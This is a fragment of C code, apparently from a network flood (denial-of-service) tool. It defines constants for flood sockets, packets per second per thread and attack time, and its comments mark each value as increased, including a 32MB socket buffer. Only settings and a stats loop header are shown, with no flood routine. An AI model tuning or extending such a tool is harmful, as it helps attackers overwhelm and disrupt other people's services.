...
#define FLOOD_SOCKETS 96          // ✅ Increased
#define MAX_PPS_PER_THREAD 25000  // ✅ Increased  
...
void set_sock_buf(int sock) {
    int buf = 33554432;  // ✅ Increased to 32MB
...
void *stats_monitor(void *arg) {
    ...
    for (int sec = 1; sec <= (ATTACK_TIME - WARMUP_SECONDS) && !atomic_load(&stop_signal); sec++) {
        sleep(1);
